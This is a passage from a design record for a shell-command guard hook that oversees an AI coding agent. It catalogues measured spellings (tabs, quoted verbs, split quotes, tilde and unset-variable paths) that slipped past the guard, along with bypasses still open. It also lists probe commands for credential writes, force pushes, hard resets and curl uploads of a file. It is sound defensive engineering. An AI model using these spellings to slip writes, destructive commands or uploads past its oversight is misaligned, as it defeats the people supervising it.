By the classification loop, `"$HOME/x"` and `'$HOME/x'` are the same seven bytes. Bash
expands the first and not the second, so their correct answers are OPPOSITE and no code
reading those bytes can separate them. Any fix placed at the classification point is
therefore wrong in one direction BY CONSTRUCTION.

### Decision: expand at COLLECTION, in one function, and leave the classification line alone

`expand_word(raw)` is defined immediately after `dequote`, because it is dequote's
replacement in VALUE positions and the two have to be read together. It returns
`(value, unresolved)`. `raw_targets` carries pairs. The five append sites change; the
classification line is UNCHANGED, because an expanded `~/x` is already absolute and its
existing is-absolute branch does the right thing with no edit. That is the smallest blast
radius available.

`dequote` stays exactly where it is for verb, flag, wrapper-positional and egress-host
resolution. Those consumers ask what a token SAYS; this one asks what it will BECOME.
`expand_word` also subsumes dequote's job and does it better: dequote strips quotes only
when the first and last characters match, so a partially quoted `$HOME"/x"` reached
classification with its quote characters attached; the scan drops them wherever they appear.

Performed, and only these: tilde expansion (leading, and after an `=` whose prefix is a
valid shell name, and after every `:` in such a word), `$NAME` and `${NAME}` parameter
expansion outside quotes and inside double quotes, and backslash escaping with bash's
different rules inside and outside double quotes.

`strip_unbalanced_close` runs as `expand_word`'s FIRST step and the existing call at the
head of the classification loop STAYS. That is not the second competing normalization point
this ADR's main body rejects: the function is idempotent, the later call still normalizes
interpreter hits and the `dd of=` substring, and the earlier one exists for one measured
reason. `(cp README.md ~)` reaches `expand_word` as the token `~)`, whose tilde-prefix
would be `)` rather than a login name, so the word would stay literal while the shell still
copies into `$HOME`.

### The assignment rule is a SHAPE rule, and it was settled by the oracle, not by the manual

The plan deliberately refused to assert an answer for a tilde after an `=` inside a word and
left both spellings for a real bash to decide. Measured:

```
of=~/x                    -> of=/home/u/x          EXPANDS
foo_1=~/x                 -> foo_1=/home/u/x       EXPANDS
a=b:~/x                   -> a=b:/home/u/x         EXPANDS (again, after the unquoted `:`)
fo-o=~/x                  -> fo-o=~/x              LITERAL
2bad=~/x                  -> 2bad=~/x              LITERAL
--opt=~/x                 -> --opt=~/x             LITERAL
cp --target-directory=~/x -> cp --target-directory=~/x   LITERAL
```

So the rule is: the text before the `=` must be a valid shell NAME. That matters here
because `dd of=` is a write form this gate collects AND SLICES, which makes the expanding
half a real bypass, while `cp --target-directory=` is correct today precisely because the
other half is not. A rule read off documentation instead of executed would have gotten one
of these two backwards.

`NAME+=~/x` also expands in a real shell and is NOT expanded here. It is disclosed rather
than handled because it can reach no collected target: `of+=` is not a `dd` operand, and any
other assignment-shaped word stays a RELATIVE path even after the tilde inside it resolves,
which the `foo_1=` and `a=b:` rows above show directly.

The login-name charset is `[A-Za-z_][A-Za-z0-9_.-]*`, and the DOT is load-bearing: a dotted
login name is one of the measured bypasses and a naive `[A-Za-z0-9_]` identifier leaves
exactly that spelling open. The leading character excludes `+`, `-` and digits, which is
what keeps `~+`, `~-` and `~N` literal BY THE RULE rather than by `getpwnam` happening to
fail on them. An unknown login name stays literal, which is what bash does, so that arm is
correct rather than merely conservative. `pwd` is imported under a `try`, so an unavailable
module leaves `~name` literal instead of taking the whole extractor (and with it every
credential and egress row) down.

### The unresolved variable: ASK, and why the other two answers are worse

`$NOPE_UNSET/x` resolves to `/x`, the filesystem ROOT, because an unset variable expands to
nothing. This hook cannot know whether an arbitrary name is set in the shell that will run
the command.

- DENY is out. It refuses a write that may be entirely legitimate, which is the wrong
  direction on an oversight boundary and is the failure this whole cycle is shaped to avoid.
- LEAVE LITERAL, the behavior before this cycle, is NOT neutral. The gate does not decline
  to answer; it AFFIRMATIVELY classifies the target as in-project and writes an audit row
  naming `<cwd>/$NOPE_UNSET/x`. A guard that is permissive only because a value is missing
  is not a policy, and an audit trail that records a fictional path is what makes a later
  reviewer read green.
- ASK is this file's OWN precedent rather than a new policy. The egress pass already decided
  the identical question for the identical shape: when `--resolve` or a proxy flag makes the
  apparent host stop being evidence, its stated rule is that "the safe answer to 'cannot be
  trusted' is the prompt, not silence". An unresolved expansion makes the apparent PATH stop
  being evidence in exactly the same way.

Two scoping decisions carry it, and both are the same trap as the quoting finding above:

- The flag is computed INSIDE `expand_word`, where quoting still exists. Recomputing it at
  the classification point would raise a false ask on `'$NOPE_UNSET/x'`, a legitimate
  in-project write, because there the two spellings are again the same bytes. Both halves
  are pinned: the bare form asks, the single-quoted form stays `local`.
- The check is ordered AFTER `is_cred` and `is_gate_state`, so `cp seed.txt $NOPE_UNSET/.env`
  still DENIES with `SEC-CREDENTIAL-WRITE` rather than asking. The credential arm classifies
  on BASENAME, which survives an unresolved prefix intact, so ordering is the only thing
  that had to be right.

An `unknown` row produces NO `local`/`outside` row, because there is no path to feed the
work gate. The bash arm reads those rows with the same `awk` shape the `cred`, `state` and
`egress` arms use, sits AFTER the work-gate loop so every deny still outranks it, and sits
immediately BEFORE the egress arm because a write target is this gate's primary vector and
only one ask can fire per command. It is declared in `tests/firedrill/_census.py` so the
refusal census does not read a new decision path as an unexplained gap.

Frequency, so the ask is not read as a new tax: it fires only when a WRITE TARGET still
carries a `$NAME` absent from the hook's own environment. `$HOME`, `$TMPDIR` and `$PWD` are
present there and resolve, so they never reach it. What remains is a variable assigned
earlier in the same command line and a variable exported in the agent's shell but not the
hook's, both genuinely unknowable here and both able to land outside the project.

The residue is disclosed rather than papered over: the forms in the header's
`UNEXPANDED FORMS BEGIN/END` block do NOT raise the ask and stay literal, so a `$(...)` or
`${VAR:-/etc}` write target is still classified as in-project. An ask worded for "an unset
variable" about a mechanism that is not one MISNAMES what is unknown, which is worse than
admitting the gap.

### Where the change lives: ONE production file, and the mirror is NOT touched

Verified by reading both files rather than assumed. The `MIRROR BEGIN/END
split_control_operators` block spans lines 922 to 1323 in `writ-bash-write-gate.sh` and 93
to 494 in `writ-worktree-safety.sh`; `verb_at` and `dequote` are in NEITHER copy's block
(1659 and 2044 in the write gate, 564 and 552 in the worktree hook), and the collection
sites and classification loop are all downstream of `MIRROR END` with no counterpart
anywhere else. So `writ/session/bash_tokens.py` and `writ-worktree-safety.sh` do not change
and the textual-identity assertion in `tests/test_bash_control_operator_split.py` stays
green by construction.

`expand_word` is deliberately NOT placed in the mirror even though a future cycle may want
it in the worktree hook. The mirror is the block the two gates SHARE; putting a helper there
that only one hook calls makes the other carry dead text that its own identity test then
pins. Adding it when the second caller exists is one edit; adding it now is churn plus a
speculative abstraction. A test asserts `expand_word` is not defined between the markers.

### Two defects RECORDED, not fixed

1. **The worktree hook has the same blindness pointing the OTHER WAY.** Traced through
   `writ-worktree-safety.sh`: `positionals()` dequotes, `target =
   strip_unbalanced_close(pos[2])`, then `abs_target = os.path.abspath(target)`. For
   `git worktree add ~/evil x` that yields `<repo_root>/~/evil`, which passes the
   `startswith(repo_root + os.sep)` test, so the hook treats it as PROJECT-LOCAL, asks
   whether `~` is gitignored, and DENIES with a message telling the user to add `~/` to
   `.gitignore`. The shell creates the worktree at `$HOME/evil`, which is out of project and
   therefore none of that gate's business; the correct verdict is `sys.exit(0)`. Same
   blindness, opposite cost: a FALSE REFUSAL with an absurd remedy rather than a bypass,
   because that hook's predicate gates what is LOCAL while this one gates what is OUTSIDE.
   It is not the same fix. It needs its own oracle population over `git worktree add`
   spellings and its own analysis of the gitignore question, and widening now would be a
   second change in a module this cycle has no oracle for. The current verdict is MEASURED
   through that hook's own extractor and PINNED, with a comment naming it a separate defect
   in the opposite direction, so a later change to it cannot pass quietly.

2. **A quote-then-unquoted word is TWO tokens, and no expansion rule can reunite them.**
   Found by this cycle's test file, not by the plan. `shlex.split('cp x "$HOME"/y',
   posix=False)` yields `['cp', 'x', '"$HOME"', '/y']`, FOUR tokens and not three, so the
   `cp` destination picker (`cand[-1]`, the last non-flag positional) takes only the
   trailing `/y` fragment and silently drops the quoted `"$HOME"` fragment as an earlier,
   ignored positional. The classified path is `/y`. This is a token-BOUNDARY defect and not
   an expansion one: `expand_word` runs PER TOKEN, so it cannot rejoin what the tokenizer
   already split. The unquoted-then-quoted spelling (`$HOME"/y"`) and the tilde-then-quoted
   spelling (`~/"y"`) both stay ONE token and are handled correctly, which is what isolates
   the defect to the adjacency rule rather than to quoting in general. The entry is left as
   a FAILING assertion in `tests/test_bash_expansion_boundary_gate.py` rather than removed
   or relabelled, because the desired end state really is "resolves like `$HOME/y`" and its
   redness is the signal that this gap needs its own cycle. Fixing it means changing the
   tokenizer, which is the mirrored block, which is a different change with a different
   blast radius.

### A finding about the existing evidence, which is why this survived

`tests/test_bash_wrapper_prefix_gate.py`'s module docstring and this hook's own cycle-S
header block both recorded a measurement in which `cp README.md ~/outside_probe.txt` DENIED
with `[ENF-PROJECT-BOUNDARY]`. That measurement was taken "from a cwd outside the project",
and that is the whole explanation: with cwd outside, `<cwd>/~/outside_probe.txt` is out of
project too, so the deny came from the CWD and not from `~` being resolved. The verdict is
real and the wrapper-prefix contrast it proves is still valid, but the note READ as evidence
that tilde targets were handled, and that is what stopped anyone re-examining them. Both
notes are corrected. No executable assertion depended on that spelling, so nothing went red
from the correction.

### Measured versus inferred

MEASURED: the twenty-six extractor rows above, before and after; the seventeen full-hook
`permissionDecision` values before and after, including the deny TAG; every expansion rule
against a real `bash` process, including the two assignment-position spellings the plan
refused to assert and the `NAME+=` form recorded as residue; the `~+` / `~-` / `~N`
divergences, the last with a `pushd` prelude so the directory stack actually has an entry;
the `unknown` ask through the full hook and through the firedrill census harness; the
credential deny ordering on both the unresolved and the expanded-tilde spellings; the
worktree hook's current verdict for `git worktree add ~/evil x`; and fifteen mutations of
the shipped code, each confirming the test that claims to cover it actually reddens.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
this family recorded. INFERRED, not measured: nothing new this cycle. The worktree hook's
own blindness is MEASURED, and only its FIX is deferred.

## Amendment (cycle U): the BASH pattern layer, and the four sites that must not be normalized

Seventh instance of the same seam, one layer earlier than every amendment above. Cycles O
through T all live at or below `shlex.split`. This one never reaches it: `case "$CMD" in
*"cp "*)` asks whether the raw command TEXT contains `c`, `p`, space, while a shell asks
whether the first WORD of a command resolves to `cp`. Those two questions disagree on
every spelling where the separator is not a single literal space, or where a quote
character sits between the letters and the separator, and every guard's default arm is
`*) exit 0`, so a disagreement is a SILENT ALLOW that the extractor never gets to judge.

### Measured before the fix, through the REAL hook

Not through the extractor, and the distinction is the whole cycle: `_extract` slices the
embedded python out of the hook and runs it standalone, which BYPASSES the bash prefilter
by construction. That is exactly why this defect survived seven cycles of extractor-level
evidence. Every figure below is a `permissionDecision` from a real `PreToolUse` envelope
piped to `hooks/scripts/writ-bash-write-gate.sh`.

```
                                            before        after
cp<TAB>readme <cred>                        SILENT        deny  [SEC-CREDENTIAL-WRITE]
"cp" readme <cred>                          SILENT        deny  [SEC-CREDENTIAL-WRITE]
'cp' readme <cred>                          SILENT        deny  [SEC-CREDENTIAL-WRITE]
"/bin/cp" readme <cred>                     SILENT        deny  [SEC-CREDENTIAL-WRITE]
echo x | tee<TAB><cred>                     SILENT        deny  [SEC-CREDENTIAL-WRITE]
git<TAB>reset --hard HEAD~1                 SILENT        deny  [ENF-IRREVERSIBLE]
"git" reset --hard HEAD~1                   SILENT        deny  [ENF-IRREVERSIBLE]
git<TAB><TAB>reset --hard HEAD~1            SILENT        deny  [ENF-IRREVERSIBLE]
git<TAB>push --force origin main            SILENT        deny  [ENF-IRREVERSIBLE]
curl<TAB>-d @readme https://example.invalid SILENT        ask   [SEC-BASH-EGRESS]
"curl" -d @readme https://example.invalid   SILENT        ask   [SEC-BASH-EGRESS]
python3 "benchmarks/bench_targets.py"       SILENT        deny  [ENF-IRREVERSIBLE]
bash hooks/scripts/auto-approve"-"gate.sh   SILENT        deny  [ENF-GATE-STATE]
python3<TAB>-c "open('src/x.py','w')"       SILENT        deny  [ENF-GATE-PLAN]

/bin/cp readme <cred>                       deny          deny  (control)
cp readme <cred>                            deny          deny  (control)
dd if=/dev/zero of=<cred>                   deny          deny  (control)
git reset --hard HEAD~1                     deny          deny  (control)
git push --force origin main                deny          deny  (control)
curl -d @readme https://example.invalid     ask           ask   (control)
python3 benchmarks/bench_targets.py         deny          deny  (control)
cat <gate-state-path>                       SILENT        SILENT (negative control)
```

Two of those rows are worth naming because they are the same family and neither is about
whitespace. `python3 "benchmarks/bench_targets.py"` was silent because the raw token ends
in a quote character, so it never matched the `*.py` glob `_irrev_script_target` walks and
the script's CONTENT was never read: the 2026-08-05 wipe vector, reachable by adding two
characters. And `auto-approve"-"gate.sh` was silent because the embedded quote pair splits
the identifier into two literal runs that a plain substring match cannot see across.

### Decision: normalize a COPY once, and route PER SITE

One normalized copy, computed immediately after `CMD="$HOOK_COMMAND"` and before the first
guard, inside a `# CMD NORMALIZATION BEGIN/END` marker block so a test can read it:

```bash
CMD_N="${CMD//[$'\t\n']/ }"
CMD_N="${CMD_N//[$'\x22\x27']/}"
while [[ "$CMD_N" == *"  "* ]]; do CMD_N="${CMD_N//  / }"; done
```

Three pieces, each settled on its own.

TAB AND NEWLINE ONLY. Space, tab and newline are exactly bash's default IFS whitespace.
Carriage return, vertical tab and form feed are NOT token separators to bash, so
translating them would model a shell that does not exist. The bracket-class substitution
is the idiom `bin/lib/common.sh` already uses, so it is a reused pattern rather than a new
one.

THE QUOTE CLASS IS SPELLED `[$'\x22\x27']`, and the reason first recorded here WAS WRONG.
The plan and the first draft of this amendment both said `[\"\']` "would silently strip
BACKSLASHES from every command", on the reasoning that inside double quotes `\'` is a
backslash followed by an apostrophe. REVIEW RAN IT: in bash 5.2.21 both spellings produce
byte-identical output across six inputs including literal backslashes, `\'`-adjacent
apostrophes and Windows-style paths, and neither strips a backslash. The `\x22\x27`
spelling stays because the code points are unambiguous to a reader, which is a
readability argument and not a correctness one.

The wrong claim is corrected in place rather than deleted, because the failure it
illustrates is this document's own subject: a confident mechanism claim, stated in three
files, that nobody executed. It is the same discipline the rest of this amendment applies
to the hook's behaviour, applied to a sentence about bash instead.

Removal with no space inserted is what a shell does for adjacent quoting, which is why
`"cp" x` and `auto-approve"-"gate` both collapse the way the shell collapses them. That
half was measured.

COLLAPSING IS REQUIRED, not tidying, and the reason is a list rather than an argument:
`git reset --hard`, `git tag -d `, `git branch -D`, `docker exec`, `docker compose exec`,
`sed -i` and `sed --in-place` each need exactly ONE space, and `git<TAB><TAB>commit` and
`git  reset  --hard` are legal shell that one space does not match.

THE MECHANISM IS ONE IFS WORD SPLIT AND REJOIN (`read -ra` then `"${_cmd_words[*]}"`),
single pass and forking nothing. IT WAS A FIXED-POINT LOOP FIRST, and review measured that
loop QUADRATIC in the longest whitespace run: `while [[ "$CMD_N" == *"  "* ]]` took 0.03s
at 10,000 consecutive spaces, 0.46s at 40,000 and 1.88s at 80,000, running on EVERY Bash
call ahead of every guard. A heredoc or a pasted blob reaches that size without trying, so
it was a hang the user would feel, and if the hook harness times out and fails open it
takes every guard in this file with it. The single pass does 400,000 spaces in 0.03s.

THE ORDER OF THE TWO NORMALIZATION LINES IS LOAD-BEARING, and it is the reason the plan
had rejected `read -ra` outright: `read` reads ONE LINE, so on raw input it would truncate
a multi-line command and blind every guard past the first newline. That objection dies
once the preceding line has already turned every newline into a space, because by then
there is no newline left to stop at. Swapping the two lines reintroduces the truncation,
which is why the hook says so at the site.

FIVE SITES TAKE THE NORMALIZED COPY, and each is a `*) exit 0` fail-open or the sole
decider at its own layer:

- THE STATE NAME GUARD. Normalize FIRST, scrub second
  (`CMD_FOR_STATE_MATCH="${CMD_N//test_manual_test_grant.py/}"`), so a quoted spelling of
  the test file name still scrubs. All ten patterns are quote-free single tokens with no
  internal space, so normalization can only ADD matches, and this guard is the ONLY layer
  for an EXECUTION vector: the extractor classifies write TARGETS and never sees an
  attempt to RUN the minter. The mid-identifier quote split is therefore closed HERE.
- `_irreversible_reason`, which now takes both spellings. `lower` folds from the
  normalized copy, the case-sensitive `git branch -D` arm reads it too (normalization
  preserves case), and `_irrev_script_target` gets it. This site has NO second layer, so a
  miss is a complete pass-through of a destructive command.
- THE `git commit` REVIEW ASK, OUTER CASE ONLY. See the next section.
- THE WRITE AND EGRESS PREFILTER, whose default arm is the whole hole. No pattern in that
  arm contains a quote character, so quote removal cannot unmatch any of them.
- THE INLINE-INTERPRETER SECOND STAGE. Stage 1 (`*python*`) is whitespace-blind already,
  so the entire miss was at stage 2, where every flag glob carries the space that precedes
  a real flag.

FOUR SITES KEEP THE RAW TEXT, and this half is the load-bearing one, because three of the
four would BREAK on the normalized copy and the fourth would loosen a guard.

- `_readonly_inspection`, ALWAYS RAW. It asks what a command CAN DO, so stripping quotes
  would make MORE commands qualify as read-only inspection (a quoted verb like `"cat"`
  would resolve), which LOOSENS an allow arm on the one guard protecting an execution
  vector. An allow-side test cannot see a new allow, so a loosening belongs in a cycle
  that can measure the allow side. The accepted cost is stated below rather than
  discovered later.
- THE INNER `_GIT_COMMIT_RE` GREP. grep is LINE ORIENTED and that regex anchors on
  `(^|[;&|]|&&|\|\|)`, so newline-flattened text would stop matching a `git commit` that
  begins the SECOND line of a multi-line command, turning a working ask into silence. It
  needs no help anyway: the regex is already `[[:space:]]+`-based, so once the outer arm
  opens on the normalized copy the inner regex matches `git<TAB>commit` on raw text with
  no change. Routing it onto the copy would also start matching `echo "; git commit"`, and
  a false ask at this site is user-visible friction by that arm's own recorded standard.
- THE `/update` GUARD. Its regex's character classes literally CONTAIN the quote
  characters (`[^[:space:]"']*`), so feeding it quote-stripped text changes what the
  pattern means.
- `WRIT_BASH_CMD="$CMD"`, THE EXTRACTOR'S INPUT, and this is the most important
  non-regression in the cycle. Redirect detection there is quote-AWARE by design:
  `shlex.split(posix=False)` keeps quote characters on tokens so that `grep '>' app.pem`
  is not read as a redirect. Feeding the normalized copy in would put a bare `>` in
  redirect position and turn that read-only grep into a `[SEC-CREDENTIAL-WRITE]` deny. The
  existing pin for that behavior goes through `_extract` and is therefore structurally
  BLIND to this mutation, which is why the new pin drives the real hook.

The review-record guard is a fifth raw site with a duller reason: its outer glob needs no
adjacent space and its inner regex is already `[[:space:]]`-based, so no measured spelling
is blind at it and there is nothing for normalization to buy.

### The false-positive direction, verified by reading the consumer rather than trusted

The prefilter's own comment claims a stray match costs one spawn and never a false verdict
because the extractor decides. VERIFIED: the consumer opens with `[ -z "$TARGETS" ] &&
exit 0`, and every deny and ask below it is driven by a ROW the extractor emitted (`cred`,
`state`, `local`, `outside`, `unknown`, `egress`). Nothing downstream reads "the prefilter
matched" as evidence, and no counter, log row or state is written on a match alone. So for
the prefilter and the interpreter stage the widening is free in VERDICT terms and not
merely cheap.

The claim does NOT hold at the other three sites, and they are treated accordingly. The
irreversibility guard, the state guard and the commit ask ARE the deciders at their own
sites, so a stray match there is a real refusal or a real prompt. For those, the widening
is confined to spellings a shell would genuinely run, the read-only inspection escape
stays on raw text so ordinary greps stay exempt, and the commit site keeps its raw inner
discriminator.

### Alternatives rejected

1. **A TOKENIZER FIX AT THIS LAYER, which is what the next reader will reach for.** Ruled
   out for the same shape of reason the cycle O amendment ruled out making `(` a token
   boundary, but with a different mechanism: an IFS `read -ra` round trip over the command
   reads ONE LINE, so a multi-line command would be TRUNCATED and every guard below would
   go blind on everything after the first newline. That is a NEW fail-open of exactly the
   class this amendment closes, and `_irrev_script_target` already carried that narrowness
   before this cycle.
2. **`extglob` (`${v//+( )/ }`) for the space collapse.** Rejected on blast radius:
   `extglob` is enabled nowhere in this repo, and turning it on changes pattern semantics
   for every `case` in a 3000-line file full of them. That is a large behavioral surface
   for one substitution, and the doubling loop is pure parameter expansion with no
   semantics to change.
3. **Normalizing the EXTRACTOR'S input as well, for consistency.** Rejected on the
   measured `grep '>' app.pem` behavior above: consistency there converts a read-only grep
   into a credential-write deny.
4. **ADDING THE BLIND SPELLINGS AS NEW PATTERNS.** Rejected because it grows a substring
   blocklist, which ABS-SECURITY-024 forbids where the valid set is enumerable. The
   command is normalized once so the EXISTING patterns see what a shell would run, and the
   decider stays the extractor's verb resolution, which is allowlist-shaped (a known verb
   in command position). Same rule is why the state guard keeps its ONE named scrub instead
   of accumulating exemptions.
5. **Widening the irreversibility guard's VERB LIST while in there.** `rm -rf`,
   `DROP TABLE` and `TRUNCATE` stay out by the recorded ruling in that block.

### Accepted cost

A quoted-verb read-only inspection naming gate state is now REFUSED where the bare
spelling is allowed. MEASURED: `cat <gate-state-path>` stays silent, `"cat"
<gate-state-path>` denies with `[ENF-GATE-STATE]`. That follows directly from
`_readonly_inspection` staying on raw text while the state guard moved to the normalized
copy, it is fail-closed, the Read tool covers it, and a test pins the asymmetry
deliberately so it reads as a decision rather than a surprise.

### The process figures, measured and not asserted

PERF-QBUDGET-001's budget here is process spawns per Bash call. Both hook versions were
run SIDE BY SIDE out of one mirror tree, so `WRIT_DIR`, cwd, env and cache were identical
between the two runs and the only difference was the hook source; the baseline copy came
from `git show HEAD:hooks/scripts/writ-bash-write-gate.sh`. Totals come from
`tests/_strace.py::trace_execve`.

IDENTIFYING THE EXTRACTOR NEEDED ONE MORE FLAG, and the reason is a measurement that
refuted the obvious discriminator. A bare-argv `execve("/usr/bin/python3", ["python3"])`
is NOT unique to the extractor: `emit_deny` and `emit_ask` in `bin/lib/common.sh` are
heredoc-fed `python3` too, so a command denying at the IRREVERSIBLE guard, which never
reaches the extractor, produces the identical shape. Counting bare argv would have
reported those as extractor hits. The extractor is therefore identified by the thing only
it has, `WRIT_BASH_CMD` in its own envp, which `strace -v` prints.

```
population                              commands   reached extractor    total execves
                                                    before    after     before   after
(a) derived blind-spelling matrix          51       19/51     51/51       409     690
(b) unchanged control set                  25        1/25      1/25       126     126
(c) widening probe, git commit -m "cp fix"  1        1/1       1/1          8       8
```

The number that matters is population (b): 126 execves before, 126 after, mean 5.0 per
call both sides, and the same single command reaching the extractor on both. That command
is `git add -A`, which matches `*"dd "*` on the substring `add ` and always did; it is a
standing illustration of the prefilter's deliberate looseness, not a regression.
Population (a) is adversarial by construction, so its 19/51 to 51/51 is the fix working
rather than a cost, and its execve growth is the price of EMITTING A REFUSAL
(`log_gate_decision` plus the friction append plus `emit_deny`), not the price of the
prefilter. Population (c) did not move at all, and the reason is worth recording because
the plan predicted it would: the raw text of `git commit -m "cp fix"` literally contains
`cp ` inside the quoted message, so it was already matching before the fix.

The plan's actual cost claim, a STRAY match whose verdict is unchanged, was measured
separately because no member of (a) is one. `"cp" --version`, `tee<TAB>--version` and
`"curl" --version` each go from 0 to 1 extractor spawn, 5 to 6 total execves, and SILENT
to SILENT: exactly the predicted one added python start, with the `$(pwd)` subshell costing
no execve because `pwd` is a builtin. `sed  --version` newly normalizes to `sed --version`
and matches NOTHING, staying at 5 execves, which is the check that collapsing does not
widen indiscriminately.

The only test-level pin is structural rather than a timing: the normalization block
between its markers must contain no command substitution, no pipe and no external command
name, so the per-call cost cannot silently grow into a fork. A timing on a loaded machine
is not a ratchet.

### Residue that stays open, so the fix is not read as wider than it is

- AN INTERPOSED GLOBAL FLAG on the irreversibility arm: `git -C /tmp reset --hard HEAD~1`,
  `git --no-pager reset --hard`, `git -c core.x=1 reset --hard`. The commit arm one site
  above already carries a `*"git -"*" commit"*` alternative for exactly this shape; the
  irreversibility arm has none. MEASURED still silent after the fix.
- REORDERED FLAGS: `git reset HEAD~1 --hard`, which git accepts. MEASURED still silent.
- ABBREVIATED LONG FLAGS (`git reset --har`, an unambiguous prefix git accepts), ALIASES
  AND WRAPPER SCRIPTS, and a VALUE ASSEMBLED FROM A VARIABLE (`V=--hard; git reset $V`).
- THE THREE MID-WORD QUOTE SPLITS on the write and egress path (`"c"p`, `c"p"`, `"c"url`).
  Normalization makes them REACH the extractor and the extractor still cannot resolve
  them: `dequote` strips only a matched OUTER pair and `shlex.split(posix=False)` splits
  `"c"p` into two tokens, the same defect as the strict xfail at `partial_quote_prefix` in
  `tests/test_bash_expansion_boundary_gate.py`. That layer is shared with two sibling hooks
  through the `MIRROR BEGIN/END` block, so it carries different risk and gets its own
  cycle. **CLOSED by cycle V below**, which is the cycle this bullet predicted: the
  adjacency repair reunites the two tokens and the rewritten `dequote` resolves the verb.
  Both strict xfails named here (`partial_quote_prefix` and
  `test_mid_word_quote_split_credential_write_would_deny`) are retired and their behaviors
  now pass unmarked.
- BACKSLASH ESCAPING (`c\p`, `git\ reset`) and ANSI-C quoting (`cp$'\x20'x`), same token
  layer, same deferral.

Each of the first three needs a per-verb argument walk (the `verb_at` shape) rather than a
phrase match, so each is the deferred token layer and not a pattern tweak. The first two
and the `"c"p` split are pinned as `xfail(strict=True)` in
`tests/test_bash_pattern_spelling_gate.py`, so a later cycle that closes any of them turns
that test GREEN, which strict mode reports as a failure and forces updating this
disclosure rather than leaving it stale. THAT MECHANISM FIRED, exactly once and exactly as
designed: cycle V closed the `"c"p` split, the strict xfail went green, the run reported a
failure, and this section was updated instead of drifting. The first two (the interposed
global flag and the reordered flags) are the irreversibility PHRASE match, a different
mechanism, and they remain pinned and still xfail.

### The population is DERIVED, which is what keeps the new test from decaying

A `# PREFILTER PATTERNS BEGIN/END` marker block wraps the write and egress arm's glob
literals and nothing else. The test parses every `*"..."*` literal out of it and keeps the
ones CONTAINING A SPACE, which is precisely the vulnerable shape (17 members today, from
`tee ` to `curl `). The space-free globs (`>`, `--in-place`, `--target-directory`) are
excluded by a PROPERTY assertion rather than by a list, so a future space-free pattern is
excluded automatically and a future space-bearing one is not. A probe table supplies one
canonical command per member, the test asserts the table's key set EQUALS the derived set,
and the three blind spellings are derived per member from the canonical probe, so a verb
added to the case block with no probe goes red instead of sitting outside a stale literal.
The canonical spelling runs as a control in every row, which is the anti-vacuity guard: a
probe whose canonical form produces no verdict fails before its blind spellings can pass
for the wrong reason.

### Measured versus inferred

MEASURED: the twenty-two full-hook `permissionDecision` values in the table above, before
and after, including the deny TAG and the two negative controls; the two residue silences;
the three populations' extractor-reach and execve figures side by side out of one mirror
tree; the four stray-match probes with their decisions on both sides; and the whole
`tests/test_bash_pattern_spelling_gate.py` matrix, whose 103 assertions each name the
mutation that reddens them.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
this family recorded. No test in this cycle creates, opens or reads a credential file; the
classifier is path-only. INFERRED, not measured: nothing. The two irreversibility residues
were executed rather than reasoned about, which is how the plan's prediction that a
destructive command on the SECOND LINE of a multi-line command was a phrase-match bypass
came to be CORRECTED: `case` glob matching is not line-anchored, so `*"git reset --hard"*`
already matched straight across an embedded newline. The genuinely line-bound blindness was
`_irrev_script_target`'s `read -ra`, and that is what the fix addresses.

## Amendment (cycle V): one shell word arriving as TWO tokens, and the quote rule that forced

Eighth instance of the seam, and the second one that lives inside `shlex.split` itself
rather than around it. Cycle O found that `posix=False` forces `whitespace_split=True`, so
a control operator glued to a token stays glued and the command after it never reaches
command position. This cycle is the same call read from the other side: `posix=False` also
ends a token at the CLOSING QUOTE of a span that STARTED that token, so ONE shell word
arrives as TWO tokens whenever an unquoted fragment is glued after a leading quoted span.

    shlex.split('cp x "$HOME"/y', comments=False, posix=False)
    -> ['cp', 'x', '"$HOME"', '/y']        one bash word, TWO tokens

A token that starts UNQUOTED absorbs the quoted spans that follow instead, which is why
only one of the two spellings was ever broken and why the defect read as cosmetic for four
cycles: `cp x $HOME"/y"` and `cp x ~/"y"` are each ONE token and always were.

### Measured before the fix

The whole splitting table was re-measured at the start of implementation rather than read
off the plan, because the direction of each consequence depends on it. Every row below is
`shlex.split(s, comments=False, posix=False)`:

| spelling | tokens |
|---|---|
| `cp x "$HOME"/y` | `['cp', 'x', '"$HOME"', '/y']` |
| `cp x $HOME"/y"` | `['cp', 'x', '$HOME"/y"']` |
| `cp x ~/"y"` | `['cp', 'x', '~/"y"']` |
| `cp x "a"b"c"` | `['cp', 'x', '"a"', 'b"c"']` |
| `cp x 'single'/y` | `['cp', 'x', "'single'", '/y']` |
| `cp x "$HOME"/y "$HOME"/z` | `['cp', 'x', '"$HOME"', '/y', '"$HOME"', '/z']` |
| `"c"p readme .env` | `['"c"', 'p', 'readme', '.env']` |
| `cat <<'EOF'>f` | `['cat', "<<'EOF'>f"]` |
| `curl -d @f "https://example.invalid"/p` | `['curl', '-d', '@f', '"https://example.invalid"', '/p']` |
| `git worktree add "scratch"/x main` | `['git', 'worktree', 'add', '"scratch"', '/x', 'main']` |

The last row of that table is the one that decides the algorithm: `cp x "$HOME"/y` and
`cp x "$HOME" /y` produce the IDENTICAL token list. The glued word and the spaced pair are
indistinguishable once tokenization has happened, so the repair cannot be a post-pass over
tokens alone.

Three DIFFERENT consequences were measured through the write gate's own extractor, and
whether the leftover fragment starts with `/` decides the direction:

* `cp x "$HOME"escape.txt` classified PROJECT-LOCAL while bash writes outside the project.
  A genuine boundary ESCAPE, in the permissive direction.
* `cp x "src"/escape.txt` classified as `/escape.txt`, OUTSIDE the project, while bash
  writes `src/escape.txt` inside it. An over-block, in the restrictive direction.
* `echo hi > "$HOME"/escape.txt` kept the quoted head and dropped the FILENAME entirely.

### Decision: repair at the RAW tokenization layer, reading the original string

`rejoin_glued_words(text, toks)` walks the token list against the text shlex was handed and
merges a token into its predecessor when the GAP between their matches is EMPTY. The
correctness argument is one sentence: `posix=False` disables quote removal and backslash
collapsing, so every token is an exact contiguous substring of `text`, and with
`whitespace_split=True` shlex never splits on punctuation, so the quote boundary is the
ONLY zero-width split it makes. Merging on an empty gap therefore reverses exactly that
split and nothing else. A whitespace gap is a real word boundary and is left alone.

Merging is transitive by construction, because a merged token is still an exact substring
of `text`: `"a"b"c"` arrives as `['"a"', 'b"c"']` and leaves as `['"a"b"c"']`, while
`cp x "$HOME"/y "$HOME"/z` keeps its two destinations apart because the gap between `/y`
and `"$HOME"` is a space.

### Alternative rejected: asking shlex where it was

